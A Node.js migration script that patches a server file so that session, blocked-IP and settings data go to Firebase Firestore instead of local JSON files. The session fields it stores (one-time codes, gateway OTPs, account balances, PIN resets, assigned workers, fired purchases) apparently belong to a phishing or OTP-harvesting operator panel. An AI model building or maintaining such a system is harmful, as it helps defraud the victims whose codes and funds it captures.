const fs = require('fs');
let code = fs.readFileSync('server.cjs', 'utf8');

code = code.replace(
  "const fs = require('fs');",
  "const fs = require('fs');\nconst admin = require('firebase-admin');\nconst firebaseConfig = require('./firebase-applet-config.json');\nif (!admin.apps.length) {\n  admin.initializeApp({ projectId: firebaseConfig.projectId });\n}\nconst adminDb = admin.firestore();"
);

code = code.replace(
  /const SESSIONS_FILE[\s\S]*?saveBlockedIps\(\) { writeJSON\(BLOCKED_IPS_FILE, blockedIps\); }/m,
  `let sessions = {};
let blockedIps = {};
let settings = {};

adminDb.collection('sessions').onSnapshot(snap => {
  const newSessions = {};
  snap.forEach(doc => { newSessions[doc.id] = doc.data(); });
  sessions = newSessions;
});
adminDb.collection('blocked_ips').onSnapshot(snap => {
  const newBlocked = {};
  snap.forEach(doc => { newBlocked[doc.id] = true; });
  blockedIps = newBlocked;
});
adminDb.collection('settings').onSnapshot(snap => {
  const newSettings = {};
  snap.forEach(doc => {
    const data = doc.data();
    newSettings[doc.id] = ('value' in data) ? data.value : data;
  });
  settings = newSettings;
});

function saveSessions() {}
function saveBlockedIps() {}`
);

code = code.replace(
  /sessionsObj\[id\] = \{ \.\.\.data, assignedWorker: null, assignedAt: null, adminAction: 'REVIEW_APP', lastUpdated: ts \};\n\s*changed = true;/g,
  `const updates = { ...data, assignedWorker: null, assignedAt: null, adminAction: 'REVIEW_APP', lastUpdated: ts };\n        sessionsObj[id] = updates;\n        adminDb.collection('sessions').doc(id).set(updates);\n        changed = true;`
);

code = code.replace(
  /sessions\[s\.id\] = \{ \.\.\.d, assignedWorker: null, assignedAt: null, adminAction: 'REVIEW_APP', lastUpdated: Date\.now\(\) \};\n\s*saveSessions\(\);/g,
  `const updates = { ...d, assignedWorker: null, assignedAt: null, adminAction: 'REVIEW_APP', lastUpdated: Date.now() };\n          sessions[s.id] = updates;\n          adminDb.collection('sessions').doc(s.id).set(updates);`
);

code = code.replace(
  /sessions\[id\] = \{ \.\.\.data, assignedWorker: worker, assignedAt: sendTime, lastAutomationData: pinOnlyData, lastUpdated: sendTime, lastDataSentAt: sendTime, lastDataType: 'pin_reset', lastActionTrigger: null, lastActionAt: 0, pinResetMode: false \};\n\s*saveSessions\(\);/g,
  `const updates = { ...data, assignedWorker: worker, assignedAt: sendTime, lastAutomationData: pinOnlyData, lastUpdated: sendTime, lastDataSentAt: sendTime, lastDataType: 'pin_reset', lastActionTrigger: null, lastActionAt: 0, pinResetMode: false };\n        sessions[id] = updates;\n        adminDb.collection('sessions').doc(id).set(updates);`
);

code = code.replace(
  /sessions\[id\] = \{ \.\.\.data, assignedWorker: worker, assignedAt: sendTime, lastAutomationData: currentData, lastUpdated: sendTime, lastDataSentAt: sendTime, lastDataType: dataType, lastActionTrigger: null, lastActionAt: 0, balance: '', otp: '', gatewayOtp: '', lastBalance: data\.balance \|\| data\.lastBalance \|\| '' \};\n\s*saveSessions\(\);/g,
  `const updates = { ...data, assignedWorker: worker, assignedAt: sendTime, lastAutomationData: currentData, lastUpdated: sendTime, lastDataSentAt: sendTime, lastDataType: dataType, lastActionTrigger: null, lastActionAt: 0, balance: '', otp: '', gatewayOtp: '', lastBalance: data.balance || data.lastBalance || '' };\n      sessions[id] = updates;\n      adminDb.collection('sessions').doc(id).set(updates);`
);

code = code.replace(
  /sessions\[id\] = \{ \.\.\.existing, \.\.\.updates \};\n\s*saveSessions\(\);/g,
  `sessions[id] = Object.assign({}, existing, updates);\n    adminDb.collection('sessions').doc(id).set(sessions[id]);`
);

code = code.replace(
  /blockedIps\[req\.body\.ip\] = true;\n\s*saveBlockedIps\(\);/g,
  `blockedIps[req.body.ip] = true;\n  adminDb.collection('blocked_ips').doc(req.body.ip).set({ blocked: true });`
);

code = code.replace(
  /delete blockedIps\[req\.body\.ip\];\n\s*saveBlockedIps\(\);/g,
  `delete blockedIps[req.body.ip];\n  adminDb.collection('blocked_ips').doc(req.body.ip).delete();`
);

code = code.replace(
  /blockedIps\[ip\] = true;\n\s*saveBlockedIps\(\);/g,
  `blockedIps[ip] = true;\n  adminDb.collection('blocked_ips').doc(ip).set({ blocked: true });`
);

code = code.replace(
  /const SETTINGS_FILE[\s\S]*?function saveSettings\(\) \{ try \{ fs.writeFileSync\(SETTINGS_FILE, JSON\.stringify\(settings, null, 2\)\); \} catch \(e\) \{\} \}/g,
  ''
);

code = code.replace(
  /sessions\[id\] = \{ \.\.\.\(sessions\[id\] \|\| \{\}\), \.\.\.data \};\n\s*saveSessions\(\);/g,
  `sessions[id] = Object.assign({}, sessions[id] || {}, data);\n    adminDb.collection('sessions').doc(id).set(sessions[id], { merge: true });`
);

code = code.replace(
  /settings\[dbPath\.replace\('settings\/', ''\)\] = data;\n\s*saveSettings\(\);/g,
  `settings[dbPath.replace('settings/', '')] = data;\n    adminDb.collection('settings').doc(dbPath.replace('settings/', '')).set({ value: data }, { merge: true });`
);

code = code.replace(
  /settings\[key\] = data;\n\s*saveSettings\(\);/g,
  `settings[key] = data;\n    adminDb.collection('settings').doc(key).set({ value: data }, { merge: true });`
);

code = code.replace(
  /delete sessions\[dbPath\.replace\('sessions\/', ''\)\];\n\s*saveSessions\(\);/g,
  `delete sessions[dbPath.replace('sessions/', '')];\n    adminDb.collection('sessions').doc(dbPath.replace('sessions/', '')).delete();`
);

code = code.replace(
  /delete settings\[dbPath\.replace\('settings\/', ''\)\];\n\s*saveSettings\(\);/g,
  `delete settings[dbPath.replace('settings/', '')];\n    adminDb.collection('settings').doc(dbPath.replace('settings/', '')).delete();`
);

code = code.replace(
  /sess\.purchaseInFlight = true;\n\s*saveSessions\(\);/g,
  `sess.purchaseInFlight = true;\n  adminDb.collection('sessions').doc(sess.id || sess.orderId || 'unknown').set(sess, { merge: true });`
);

code = code.replace(
  /sess\.purchaseFiredAt = Date\.now\(\);\n\s*\} else \{\n\s*sess\.purchaseLastError = \(result && \(result\.reason \|\| JSON\.stringify\(result\.error\)\)\) \|\| 'unknown';\n\s*sess\.purchaseLastAttemptAt = Date\.now\(\);\n\s*\}\n\s*saveSessions\(\);/g,
  `sess.purchaseFiredAt = Date.now();\n  } else {\n    sess.purchaseLastError = (result && (result.reason || JSON.stringify(result.error))) || 'unknown';\n    sess.purchaseLastAttemptAt = Date.now();\n  }\n  adminDb.collection('sessions').doc(sess.id || sess.orderId || 'unknown').set(sess, { merge: true });`
);

code = code.replace(
  /sessions = \{\};\n\s*saveSessions\(\);/g,
  `sessions = {};`
);

fs.writeFileSync('server.cjs', code, 'utf8');
